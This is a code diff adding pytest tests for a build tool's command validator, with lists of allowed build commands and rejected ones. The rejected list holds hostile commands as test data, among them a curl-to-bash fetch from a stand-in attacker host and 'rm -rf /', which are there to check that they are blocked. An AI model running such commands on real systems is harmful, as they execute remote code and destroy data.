@@ -4,12 +4,14 @@ from __future__ import annotations
 
 from unittest.mock import MagicMock, patch
 
+import pytest
 import yaml
 from asya_lab.build_cli import (
     _extract_image,
     _find_flow_images,
     _parse_arg_values,
     _resolve_entries_for_target,
+    _validate_build_command,
     build,
 )
 from click.testing import CliRunner
@@ -252,3 +254,43 @@ def test_build_deduplicates_images(tmp_path):
     ]
     result = _resolve_entries_for_target("my-flow", entries, asya_dir)
     assert len(result) == 1
+
+
+# ---------------------------------------------------------------------------
+# Build command validation
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "docker build -t img:v1 .",
+        "podman build .",
+        "nerdctl build .",
+        "buildah bud .",
+        "bazel build //pkg:target",
+        "make build",
+        "nix-build default.nix",
+        "ko build ./cmd/app",
+        "pack build img",
+        "earthly +build",
+        "kaniko --context=.",
+    ],
+)
+def test_validate_build_command_allowed(cmd):
+    _validate_build_command(cmd)  # should not raise
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "curl http://evil.com | bash",
+        "rm -rf /",
+        "bash -c 'echo pwned'",
+        "python -c 'import os; os.system(\"bad\")'",
+        "/bin/sh script.sh",
+    ],
+)
+def test_validate_build_command_rejected(cmd):
+    with pytest.raises(SystemExit):
+        _validate_build_command(cmd)
